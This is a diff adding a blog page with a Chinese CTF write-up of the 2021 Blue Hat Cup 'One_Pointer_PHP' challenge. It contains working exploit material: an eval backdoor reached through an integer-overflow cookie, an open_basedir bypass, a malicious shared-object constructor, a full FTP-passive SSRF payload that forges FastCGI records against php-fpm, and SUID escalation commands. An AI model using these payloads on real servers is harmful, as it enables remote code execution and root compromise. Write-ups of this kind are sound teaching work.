@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="odiws">
+
+
+
+
+
+<title>[蓝帽杯_2021]One_Pointer_PHP | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">[蓝帽杯_2021]One_Pointer_PHP</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">odiws</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">November 7, 2024&nbsp;&nbsp;21:27:47</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">刷题笔记</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="蓝帽杯-2021-One-Pointer-PHP"><a href="#蓝帽杯-2021-One-Pointer-PHP" class="headerlink" title="[蓝帽杯_2021]One_Pointer_PHP"></a>[蓝帽杯_2021]One_Pointer_PHP</h2><p>add_api.php的漏洞（给了源码）:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> <span class="title class_">User</span>;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="PHP-数组溢出绕过限制："><a href="#PHP-数组溢出绕过限制：" class="headerlink" title="PHP 数组溢出绕过限制："></a>PHP 数组溢出绕过限制：</h4><p>当数组里面的个数为PHP_INT_MAX时，数值时会报错</p>
+<p>当给一个数组的<code>PHP_INT_MAX + 1</code>索引赋值时，会爆warning，不同位数的操作系统PHP_INT_MAX值不同，32位的是<code>0x7FFFFFFF</code>，64位的是<code>0x7FFFFFFFFFFFFFFF</code></p>
+<p>因此我们这里传入<code>$user-&gt;count = 0x7FFFFFFFFFFFFFFF - 1</code>(9223372036854775806)可以绕过</p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072141931.png" alt="image-20241107214151756"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p>即可绕过</p>
+<h4 id="读配置文件"><a href="#读配置文件" class="headerlink" title="读配置文件"></a>读配置文件</h4><p>先看phpinfo()里面禁了些什么函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive</span><br></pre></td></tr></table></figure>
+
+<p>肯定是不能直接命令执行了，得绕disable_function，还有open_basedir的限制目录，但是file_put_contents函数（写文件）（第一个参数文件名，第二个是内容，若是一句话木马就得用单引号）和file_get_contents函数（读文件双引号就行）</p>
+<h4 id="绕过open-basedir读敏感文件"><a href="#绕过open-basedir读敏感文件" class="headerlink" title="绕过open_basedir读敏感文件"></a>绕过open_basedir读敏感文件</h4><p>由于是php，且在phpinfo中看到了FPM&#x2F;FastCGI，可以知道是php-fpm进程管理的FastCGI。于是读一下nginx相关的配置文件</p>
+<ul>
+<li>&#x2F;etc&#x2F;nginx&#x2F;nginx.conf：先读这个，发现有include &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;*</li>
+<li>&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;default：再读这个</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir(&#x27;c&#x27;);</span><br><span class="line">chdir(&#x27;c&#x27;);</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);</span><br><span class="line">var_dump(file_get_contents(&quot;/etc/nginx/nginx.conf&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>读了之后发现php-fpm的端口是9001，且使用的TCP连接的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">root           html;</span><br><span class="line">fastcgi_pass   127.0.0.1:9001;</span><br><span class="line">fastcgi_index  index.php;</span><br><span class="line">fastcgi_param  SCRIPT_FILENAME  /var/www/html/$fastcgi_script_name;</span><br><span class="line">include        fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>尝试打了一下FPM未授权访问的RCE，发现弹不回shell，直接打貌似打不通。</p>
+<p>伪造FastCGI加载恶意.so</p>
+<p>c文件：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="type">void</span> <span class="title">preload</span> <span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;ls / &gt;/var/www/html/dd&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在linux上编译一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hpdoger.c -fPIC -shared -o hpdoger.so</span><br></pre></td></tr></table></figure>
+
+<p>上传文件到&#x2F;var&#x2F;www&#x2F;html或者&#x2F;tmp&#x2F;下都行（得先写马连接蚁剑，在进行上传）</p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072212329.png" alt="image-20241107221222292"></p>
+<p>然后就用加载恶意so文件的这个php文件的运行后的东西留着</p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072154542.png" alt="image-20241107215406307"></p>
+<p>接下来要寻找一种方式来把我们的恶意bin发送到php-fpm的9001端口上，这里我们需要考虑PHP Stream Wrapper(php支持和封装的协议)下有没有什么可以利用的协议，然后配合<code>file_put_contents</code>通过SSRF的方式打到9001上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">这里有权限限制，无法读取任意文件</span><br><span class="line"></span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">端口探测，不能发送数据</span><br><span class="line"></span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line"></span><br><span class="line">zlib:// — 压缩流</span><br><span class="line"></span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line"></span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line"></span><br><span class="line">压根就没用</span><br><span class="line"></span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">没链子，打不了</span><br><span class="line"></span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line"></span><br><span class="line">rar:// — RAR</span><br><span class="line"></span><br><span class="line">ogg:// — 音频流</span><br><span class="line"></span><br><span class="line">expect:// — 处理交互式的流</span><br><span class="line"></span><br><span class="line">上面四个需要安装PECL扩展，本身也无法利用</span><br></pre></td></tr></table></figure>
+
+<p>最后就只剩下FTP协议满足我们的要求了，既可以发送数据，又正好不受其他权限的限制</p>
+<h4 id="FTP-Passive-Mode发bin给php-fpm"><a href="#FTP-Passive-Mode发bin给php-fpm" class="headerlink" title="FTP Passive Mode发bin给php-fpm"></a>FTP Passive Mode发bin给php-fpm</h4><p>可以利用<code>file_get_contents</code>配合<code>ftp://</code>协议来把恶意bin打到FastCGI上，这里又牵扯到FTP的主动&#x2F;被动模式，我们需要利用FTP的被动模式来伪造客户端端口，使得服务端将数据发送到9001端口上。<strong>这是因为在FTP被动模式下，是由客户端主动向服务端发起请求，并告知服务端需要连接交互的端口，所以这里的端口是客户端可控可伪造的</strong>。因此我们可以在起一个FTP的客户端，模拟发送FTP passive mode的包，当服务端通过<code>ftp://&lt;VPS&gt;:&lt;PORT&gt;</code>和客户端发起交互时，客户端模拟Passive Mode请求，其中伪造端口为<strong>127.0.0.1:9001</strong>，这样服务端就会把恶意bin打到php-fpm上从而完成RCE。</p>
+<p>先准备一个ftp.py来起ftp服务器模拟客户端请求，端口绑定到自己的vps的23端口上</p>
+<p>再在vps上面起nc监听</p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072158697.png" alt="image-20241107215835605"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072158265.png" alt="image-20241107215850110"></p>
+<p>两个都要起在add_api.ph里面发送ftp申请</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/add_api.php?backdoor=$file = $_GET[&#x27;file&#x27;];$data = $_GET[&#x27;data&#x27;];file_put_contents($file,$data);&amp;file=ftp://aaa@vps:23/123&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072207507.png" alt="image-20241107220741392"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072208814.png" alt="image-20241107220800723"></p>
+<p>此时当 ftp 建立连接后，会通过被动模式将 payload 重定向到目标主机本地 9001 端口的 PHP-FPM 上，并成功反弹</p>
+<p>后面就是一个 SUID 提权了，利用的是 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;php，直接进行 PHP 交互模式执行代码获取 flag 即可。</p>
+<h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p><strong>.查看SUID可执行文件的命令</strong></p>
+<ul>
+<li><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
+</li>
+<li><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+</li>
+<li><p><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</code></p>
+<p>以上任意一条均可查看</p>
+</li>
+</ul>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072210673.png" alt="image-20241107221037597"></p>
+<p>获取这个东西，发现有这个php可以利用（网上好像也没有这个的利用方法），直接、</p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072211471.png" alt="image-20241107221136272"></p>
+<p>获取flag（直接运行获取root权限访问flag文件（只是这一条有root权限））</p>
+<p>也可以交互模式获取flag：<br><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072219158.png" alt="image-20241107221950934"></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/475">https://forum.butian.net/share/475</a></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.diggid.fun/2021/05/04/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP-%E5%A4%8D%E7%8E%B0/#%E6%9C%80%E5%A4%A7%E6%95%B4%E6%95%B0%E7%BB%95%E8%BF%87%E6%95%B0%E7%BB%84%E8%B5%8B%E5%80%BC">https://blog.diggid.fun/2021/05/04/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP-%E5%A4%8D%E7%8E%B0/#%E6%9C%80%E5%A4%A7%E6%95%B4%E6%95%B0%E7%BB%95%E8%BF%87%E6%95%B0%E7%BB%84%E8%B5%8B%E5%80%BC</a></p>
+<p>参考连接：<a target="_blank" rel="noopener" href="https://blog.qiuye.ink/2022/09/27/CTF/web/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8Bfastcgi%E4%B8%8Essrf/#writeup">https://blog.qiuye.ink/2022/09/27/CTF/web/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8Bfastcgi%E4%B8%8Essrf/#writeup</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>odiws</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://odiws.github.io/2024/11/07/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/">http://odiws.github.io/2024/11/07/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/buuctf/"># buuctf</a>
+                    
+                        <a href="/tags/fastcgi-php-FPM/"># fastcgi-php-FPM</a>
+                    
+                        <a href="/tags/disable-function/"># disable_function</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/11/08/HarekazeCTF2019-Sqlite-Voting/">[HarekazeCTF2019]Sqlite-Voting</a>
+            
+            
+            <a class="next" rel="next" href="/2024/11/05/WMCTF2020-Web-Check-in-2-0/">[WMCTF2020]Web-Check-in-2.0</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© odiws | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
